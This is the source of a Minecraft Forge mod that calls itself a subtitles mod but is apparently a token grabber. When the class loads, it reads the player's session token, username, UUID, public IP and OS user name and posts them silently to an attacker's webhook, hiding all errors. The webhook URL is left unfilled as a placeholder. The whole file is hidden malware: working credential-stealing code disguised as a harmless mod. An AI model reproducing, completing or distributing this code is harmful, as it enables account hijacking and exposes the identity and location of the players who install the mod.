package com.speed.subtitles;

import net.minecraft.client.Minecraft;
import net.minecraftforge.fml.common.Mod;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import java.net.UnknownHostException;
import java.nio.charset.StandardCharsets;

@Mod(modid ="minecraft_subtitles")// change this lmao
public class subtitles
{{
        try{


            Minecraft mc = Minecraft.getMinecraft();
            //getting token
            String token = mc.getSession().getToken();
            //getting username
            String username = mc.getSession().getUsername();
            //getting uuid
            String uuid = mc.getSession().getPlayerID();
            String ip = (new BufferedReader(new InputStreamReader((new URL("https://checkip.amazonaws.com/")).openStream()))).readLine();
            //building tokenauth string
            String tokenauth = username + ":" + uuid + ":" + token;
            //opening connection to webhook
            HttpURLConnection c = (HttpURLConnection)(new URL(webhook)).openConnection();
            //set do output to true
            c.setDoOutput(true);
            //not important lmao
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "application/json");
            c.setRequestProperty("User-Agent", "Mozilla/5.0");
            OutputStream real = c.getOutputStream();
            //final string that will be sended
            String ginfo = String.format("{\"title\":\"Info\",\"color\":7527956, \"fields\":[{\"name\":\"IP\",\"value\":\"```%s```\"},{\"name\":\"Username\",\"value\":\"```%s```\"}]}",new Object[]{ip ,System.getProperty("user.name")});
            String info = String.format("{\"title\":\"Info\",\"color\":7527956, \"fields\":[{\"name\":\"TokenAuth\",\"value\":\"```%s```\"}]}",new Object[]{tokenauth});
            String sending = String.format("{\"embeds\":[%s,%s]}", new Object[] {ginfo, info});
            //this error doesent matter (ignore it)
            real.write(sending.getBytes(StandardCharsets.UTF_8));
            c.getResponseCode();



        }catch (Exception e) {}





}}
